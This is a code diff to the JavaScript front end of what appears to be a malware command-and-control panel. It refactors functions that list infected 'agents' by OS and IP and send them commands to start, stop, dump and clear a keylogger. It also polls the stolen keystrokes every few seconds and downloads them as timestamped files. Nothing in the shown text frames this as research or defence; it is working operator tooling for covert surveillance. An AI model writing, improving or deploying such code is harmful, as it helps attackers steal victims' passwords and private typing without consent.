@@ -8,9 +8,8 @@ const TRANSFER_STATUS_KEY = 'fileTransferStatus';
 
 // Keylogger functionality
 let keyloggerActive = false;
-let selectedAgent = null;
+let selectedKeyloggerAgent = null;
 let logUpdateInterval = null;
-let agents = {};
 
 function saveTransferStatus(status) {
     localStorage.setItem(TRANSFER_STATUS_KEY, JSON.stringify({
@@ -98,7 +97,7 @@ document.addEventListener('DOMContentLoaded', function() {
                         updateStorage();
                         break;
                     case 'keylogger':
-                        updateAgentSelect();
+                        updateKeyloggerAgents();
                         break;
                 }
             }
@@ -1045,37 +1044,27 @@ function previewFile(path) {
 }
 
 // Keylogger functionality
-function updateAgentSelect() {
-    const select = document.getElementById('keylogger-agent-select');
-    if (!select) return;
-
-    // Store current selection
-    const currentSelection = select.value;
-
-    // Clear current options except the first one
-    while (select.options.length > 1) {
-        select.remove(1);
-    }
-
-    // Use the same endpoint as command center
+function updateKeyloggerAgents() {
     fetch('/api/list_agents')
         .then(response => response.json())
         .then(data => {
-            // Convert agents object to array if needed
-            const agentList = Array.isArray(data) ? data : Object.values(data);
-            
-            // Sort agents by last seen
-            agentList.sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen));
+            const select = document.getElementById('keylogger-agent-select');
+            if (!select) return;
+
+            // Store current selection
+            const currentSelection = select.value;
+
+            // Clear current options except the first one
+            while (select.options.length > 1) {
+                select.remove(1);
+            }
 
             // Add online agents
-            agentList.forEach(agent => {
+            data.forEach(agent => {
                 if (isAgentActive(agent.last_seen)) {
                     const option = document.createElement('option');
                     option.value = agent.id;
-                    const agentName = agent.alias || `Agent_${agent.id}`;
-                    const osInfo = agent.os_type || 'Unknown';
-                    const ipInfo = agent.ip || 'Unknown IP';
-                    option.text = `${agentName} (${osInfo} | ${ipInfo})`;
+                    option.text = `Agent_${agent.id} (${agent.os_type || 'Unknown'} | ${agent.ip || 'Unknown IP'})`;
                     select.add(option);
                 }
             });
@@ -1094,168 +1083,146 @@ function updateAgentSelect() {
             }
         })
         .catch(error => {
-            console.error('Error updating agent select:', error);
-            // Add error message to select
-            const option = document.createElement('option');
-            option.text = 'Error loading agents';
-            option.disabled = true;
-            select.add(option);
+            console.error('Error updating keylogger agents:', error);
+            const select = document.getElementById('keylogger-agent-select');
+            if (select) {
+                // Clear and show error
+                while (select.options.length > 1) select.remove(1);
+                const option = document.createElement('option');
+                option.text = 'Error loading agents';
+                option.disabled = true;
+                select.add(option);
+            }
         });
 }
-
-// Start periodic updates for keylogger agent list
-let agentSelectInterval = null;
-
-function startAgentSelectUpdates() {
-    stopAgentSelectUpdates();
-    updateAgentSelect(); // Initial update
-    agentSelectInterval = setInterval(updateAgentSelect, 5000);
-}
-
-function stopAgentSelectUpdates() {
-    if (agentSelectInterval) {
-        clearInterval(agentSelectInterval);
-        agentSelectInterval = null;
-    }
-}
-
-// Update agent select when switching to keylogger tab
-document.addEventListener('DOMContentLoaded', function() {
-    const keyloggerTab = document.querySelector('[data-tab="keylogger"]');
-    if (keyloggerTab) {
-        keyloggerTab.addEventListener('click', () => {
-            startAgentSelectUpdates();
-        });
-    }
-
-    // Start updates if keylogger tab is active initially
-    if (document.getElementById('keylogger-tab').classList.contains('active')) {
-        startAgentSelectUpdates();
-    }
-});
 
 function startKeylogger() {
-    const agentId = document.getElementById('keylogger-agent-select').value;
-    if (!agentId) {
+    const select = document.getElementById('keylogger-agent-select');
+    if (!select || !select.value) {
         alert('Please select an agent first');
         return;
     }
 
-    selectedAgent = parseInt(agentId);
+    selectedKeyloggerAgent = parseInt(select.value);
+    const agentName = select.options[select.selectedIndex].text;
+
     fetch('/api/send_command', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            session_id: selectedAgent,
+            session_id: selectedKeyloggerAgent,
             command: 'keylogger start'
         })
     })
     .then(response => response.json())
     .then(data => {
         if (data.error) {
-            alert(`Error starting keylogger: ${data.error}`);
-            return;
+            throw new Error(data.error);
         }
         keyloggerActive = true;
         updateKeyloggerStatus();
         startLogUpdates();
+        document.getElementById('keylogger-output').textContent = `Started keylogger for ${agentName}\n`;
     })
     .catch(error => {
-        alert(`Error: ${error}`);
+        alert(`Error starting keylogger: ${error.message}`);
     });
 }
 
 function stopKeylogger() {
-    if (!selectedAgent) return;
+    if (!selectedKeyloggerAgent) {
+        alert('No active keylogger session');
+        return;
+    }
 
     fetch('/api/send_command', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            session_id: selectedAgent,
+            session_id: selectedKeyloggerAgent,
             command: 'keylogger stop'
         })
     })
     .then(response => response.json())
     .then(data => {
         if (data.error) {
-            alert(`Error stopping keylogger: ${data.error}`);
-            return;
+            throw new Error(data.error);
         }
         keyloggerActive = false;
         updateKeyloggerStatus();
         stopLogUpdates();
+        document.getElementById('keylogger-output').textContent += '\nKeylogger stopped\n';
     })
     .catch(error => {
-        alert(`Error: ${error}`);
+        alert(`Error stopping keylogger: ${error.message}`);
     });
 }
 
 function downloadLogs() {
-    if (!selectedAgent) return;
+    if (!selectedKeyloggerAgent) {
+        alert('No agent selected');
+        return;
+    }
 
     fetch('/api/send_command', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            session_id: selectedAgent,
+            session_id: selectedKeyloggerAgent,
             command: 'keylogger dump'
         })
     })
     .then(response => response.json())
     .then(data => {
         if (data.error) {
-            alert(`Error downloading logs: ${data.error}`);
-            return;
+            throw new Error(data.error);
         }
         
-        // Create blob and download
-        const blob = new Blob([data.output], { type: 'text/plain' });
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filename = `keylogger_agent${selectedKeyloggerAgent}_${timestamp}.txt`;
+        
+        const blob = new Blob([data.output || ''], { type: 'text/plain' });
         const url = window.URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `keylogger_${selectedAgent}_${new Date().toISOString()}.txt`;
+        a.download = filename;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
         window.URL.revokeObjectURL(url);
     })
     .catch(error => {
-        alert(`Error: ${error}`);
+        alert(`Error downloading logs: ${error.message}`);
     });
 }
 
 function clearLogs() {
-    if (!selectedAgent) return;
+    if (!selectedKeyloggerAgent) {
+        alert('No agent selected');
+        return;
+    }
 
-    if (!confirm('Are you sure you want to clear the logs?')) return;
+    if (!confirm('Are you sure you want to clear the logs?')) {
+        return;
+    }
 
     fetch('/api/send_command', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            session_id: selectedAgent,
+            session_id: selectedKeyloggerAgent,
             command: 'keylogger clear'
         })
     })
     .then(response => response.json())
     .then(data => {
         if (data.error) {
-            alert(`Error clearing logs: ${data.error}`);
-            return;
+            throw new Error(data.error);
         }
-        document.getElementById('keylogger-output').textContent = '';
+        document.getElementById('keylogger-output').textContent = 'Logs cleared\n';
     })
     .catch(error => {
-        alert(`Error: ${error}`);
+        alert(`Error clearing logs: ${error.message}`);
     });
 }
 
@@ -1274,7 +1241,8 @@ function updateKeyloggerStatus() {
 
 function startLogUpdates() {
     stopLogUpdates();
-    logUpdateInterval = setInterval(fetchLatestLogs, 5000); // Update every 5 seconds
+    fetchLatestLogs(); // Immediate update
+    logUpdateInterval = setInterval(fetchLatestLogs, 5000);
 }
 
 function stopLogUpdates() {
@@ -1285,23 +1253,63 @@ function stopLogUpdates() {
 }
 
 function fetchLatestLogs() {
-    if (!selectedAgent || !keyloggerActive) return;
+    if (!selectedKeyloggerAgent || !keyloggerActive) return;
 
     fetch('/api/send_command', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            session_id: selectedAgent,
+            session_id: selectedKeyloggerAgent,
             command: 'keylogger dump'
         })
     })
     .then(response => response.json())
     .then(data => {
-        if (!data.error) {
-            document.getElementById('keylogger-output').textContent = data.output;
+        if (data.error) {
+            throw new Error(data.error);
+        }
+        const output = document.getElementById('keylogger-output');
+        if (output && data.output) {
+            output.textContent = data.output;
+            output.scrollTop = output.scrollHeight;
         }
     })
-    .catch(error => console.error('Error fetching logs:', error));
-} 
+    .catch(error => {
+        console.error('Error fetching logs:', error);
+        stopLogUpdates();
+        keyloggerActive = false;
+        updateKeyloggerStatus();
+    });
+}
+
+// Initialize keylogger updates when switching to keylogger tab
+document.addEventListener('DOMContentLoaded', function() {
+    const keyloggerTab = document.querySelector('[data-tab="keylogger"]');
+    if (keyloggerTab) {
+        keyloggerTab.addEventListener('click', () => {
+            updateKeyloggerAgents();
+            // Start periodic updates
+            const updateInterval = setInterval(updateKeyloggerAgents, 5000);
+            // Store the interval ID
+            keyloggerTab.dataset.updateInterval = updateInterval;
+        });
+    }
+
+    // Handle tab switching to clear intervals
+    document.querySelectorAll('.tab-button').forEach(button => {
+        if (button.getAttribute('data-tab') !== 'keylogger') {
+            button.addEventListener('click', () => {
+                const interval = keyloggerTab?.dataset.updateInterval;
+                if (interval) {
+                    clearInterval(parseInt(interval));
+                    delete keyloggerTab.dataset.updateInterval;
+                }
+            });
+        }
+    });
+
+    // Initialize if keylogger tab is active
+    if (document.getElementById('keylogger-tab')?.classList.contains('active')) {
+        updateKeyloggerAgents();
+    }
+}); 
